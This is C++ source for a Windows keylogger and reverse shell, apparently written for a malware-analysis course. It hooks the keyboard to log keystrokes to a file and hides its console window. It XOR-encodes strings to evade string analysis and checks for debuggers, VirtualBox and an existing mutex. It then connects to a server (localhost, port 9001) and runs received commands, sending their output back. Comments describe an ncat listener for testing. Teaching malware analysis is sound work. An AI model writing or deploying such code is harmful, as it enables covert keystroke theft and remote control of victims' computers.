#undef UNICODE
#include <stdio.h>
#include <stdlib.h>
#define _CRT_SECURE_NO_WARNINGS
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#if defined(DM_PLATFORM_IOS) || defined(DM_PLATFORM_OSX) || defined(DM_PLATFORM_ANDROID)
#include <unistd.h>
#endif
#include <winsock2.h>
#include <WS2tcpip.h>
#include <winuser.h>
#include <wininet.h>
#include <windows.h>
#include <windowsx.h>
#include <fstream>

#pragma comment(lib,"ws2_32")
#pragma comment(lib,"user32") 
#pragma comment(lib,"advapi32")
#pragma comment(lib,"kernel32")

#undef UNICODE!
#define _WIN32_WINNT 0x0500
#define bzero(p, size) (void)memset((p), 0, (size))
using namespace std;

ofstream out("keys.txt", ios::out);
int sock;
typedef UINT (CALLBACK* LPFNDLLFUNC1)();

char* TestEnDecode(char* val, int length) {
    char* newString = (char*)malloc(sizeof(char) * (length + 1));
    char key = 0x55;
    key = 0x55 & 0x4B;
    for (int i = 0; i < length; i++) {
        newString[i] = val[i] ^ key; //'A'
    }
    return newString;
}

bool IsVBOX(const char* RegLocation) {
    HKEY HK = 0;
    return RegOpenKeyEx(HKEY_LOCAL_MACHINE, RegLocation, 0, KEY_READ, &HK) == ERROR_SUCCESS;
}
//bool IsVMWare() {
    //REMOVED, this was running into errors
    //and majority of students are using virtual box anyways
//}
bool HasDebugger(){
    HINSTANCE hDLL;               // Handle to DLL
    LPFNDLLFUNC1 lpfnDllFunc1;    // Function pointer
    char func[] = {
        0x08, 0x32, 0x05, 0x24, 0x23, 0x34, 0x26, 0x26, 0x24, 0x33, 0x11, 0x33, 0x24, 0x32, 0x24, 0x2F, 0x35, 0x41
    };
    const int func_len = 18;
    char* func2 = TestEnDecode(&func[0], func_len);

    hDLL = LoadLibrary("kernel32");
    if (hDLL != NULL)
    {
        lpfnDllFunc1 = (LPFNDLLFUNC1)GetProcAddress(hDLL, func2);
        if (!lpfnDllFunc1)
        {
            // handle the error
            FreeLibrary(hDLL);
            return true;
        }
        else
        {
            // call the function
            return lpfnDllFunc1();
        }
    }
    return true; //also an error
}

bool CheckMutexExists() {
    CreateMutexA(0, FALSE, "foofoo");
    return GetLastError() == ERROR_ALREADY_EXISTS;
}


int init_me() {

    //NOTE: This XOR encoded string should not show up in the Strings section of IDA
    // char* vbox = "HARDWARE\\ACPI\\DSDT\\VBOX__";
    char vbox[] = { 0x09, 0x00, 0x13, 0x05, 0x16, 0x00, 0x13, 0x04, 0x1D,
                        0x1D, 0x00, 0x02, 0x11, 0x08, 0x1D, 0x1D, 0x05, 0x12, 0x05,
                        0x15, 0x1D, 0x1D, 0x17, 0x03, 0x0E, 0x19, 0x1E, 0x1E, 0x41 };

    const int vbox_len = 29;

    //example: 127.0.0.1
    char addr[] = {
        0x70, 0x73, 0x76, 0x6F, 0x71, 0x6F, 0x71, 0x6F, 0x70, 0x41
    };
    const int addr_len = 10;
    char* addr2 = TestEnDecode(&addr[0], addr_len);

    //DECODE HERE
    const char* vbox2 = TestEnDecode(&vbox[0], vbox_len);

    //if (IsVBOX(vbox2)) return 1; //use !IsVBOX(vbox) if you are testing code on VM
    //(1130) Annotate for debugging on virtual machines
    if (HasDebugger()) return 2;
    if (CheckMutexExists()) return 3;
    return 0;
}

LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);
    // If key is being pressed
    if (wParam == WM_KEYDOWN) {
        switch (p->vkCode) {
            // Invisible keys
        case VK_CAPITAL:	out << "<CAPLOCK>";		break;
        case VK_SHIFT:		out << "<SHIFT>";		break;
        case VK_LCONTROL:	out << "<LCTRL>";		break;
        case VK_RCONTROL:	out << "<RCTRL>";		break;
        case VK_INSERT:		out << "<INSERT>";		break;
        case VK_END:		out << "<END>";			break;
        case VK_PRINT:		out << "<PRINT>";		break;
        case VK_DELETE:		out << "<DEL>";			break;
        case VK_BACK:		out << "<BK>";			break;
        case VK_LEFT:		out << "<LEFT>";		break;
        case VK_RIGHT:		out << "<RIGHT>";		break;
        case VK_UP:			out << "<UP>";			break;
        case VK_DOWN:		out << "<DOWN>";		break;

            // Visible keys
        default:
            out << char(tolower(p->vkCode));
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void Shell() {
    char buffer[1024];
    char container[1024];
    char total_response[18384];

    while (TRUE) {
    jump:
        bzero(buffer, sizeof(buffer));
        bzero(container, sizeof(container));
        bzero(total_response, sizeof(total_response));
        char error_msg[] = "Unable to process this command";
        recv(sock, buffer, sizeof(buffer), 0);

        if (strncmp("q", buffer, 1) == 0) {
            if (!out) out.close();
            closesocket(sock);
            WSACleanup();
            exit(0);
        }
        else if (strncmp("k", buffer, 1) == 0) {
            try {
                out.open("keys.txt");
            }
            catch (exception) {
                send(sock, error_msg, sizeof(error_msg), 0);
            }
        }
        else if (strncmp("x", buffer, 1) == 0) {
            try {
                out.close();
            }
            catch (exception) {
                send(sock, error_msg, sizeof(error_msg), 0);
            }
        }
        else {
            FILE* fp;
            fp = _popen(buffer, "r");
            while (fgets(container, 1024, fp) != NULL) {
                strcat_s(total_response, container);
            }
            send(sock, total_response, sizeof(total_response), 0);
            fclose(fp);
        }
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    // Set windows hook

    int init_status = init_me();
    /*if (init_status == 1)
        return MessageBoxA(NULL, "goodbye, world", "caption", 0);
    if (init_status == 2)
        return MessageBoxA(NULL, "oh no you didn't", "caption", 0);
    if (init_status == 3)
        return MessageBoxA(NULL, "you already exist foo", "caption", 0);
    return MessageBoxA(NULL, "hello, world", "caption", 0);*/

    HHOOK keyboardHook = SetWindowsHookEx(
        WH_KEYBOARD_LL,
        keyboardHookProc,
        hInstance,
        0);
    //out.close();

    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
    struct sockaddr_in ServAddr;
    unsigned short ServPort;
    char* ServIP;
    WSADATA wsaData;
    //Set ServIP to 127.0.0.1
    char addr[] = {
        0x70, 0x73, 0x76, 0x6F, 0x71, 0x6F, 0x71, 0x6F, 0x70, 0x41
    };
    const int addr_len = 10;
    ServIP = TestEnDecode(&addr[0], addr_len);
    ServPort = 9001;

    if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0) {
        exit(1);
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);
    memset(&ServAddr, 0, sizeof(ServAddr));
    ServAddr.sin_family = AF_INET;
    ServAddr.sin_addr.s_addr = inet_addr(ServIP);
    //InetPton(AF_INET, "192.168.1.1", &ServAddr.sin_addr.s_addr);
    ServAddr.sin_port = htons(ServPort);

    //instructions to test reverse shell:
    //1. Download and install nmap for Windows (ncat is packaged with it)
    //2. Open cmd.exe
    //3. ncat -lvp 9001 (attacker is listening for a connection)
    //4. Run malware with ServIP to connect to 127.0.0.1 (malware tries to connect to attacker)

// start:
    while (connect(sock, (struct sockaddr*)&ServAddr, sizeof(ServAddr)) != 0) {
        Sleep(10);
        // goto start; //this is going to eat up memory
    }
    Shell();
    return 0;
}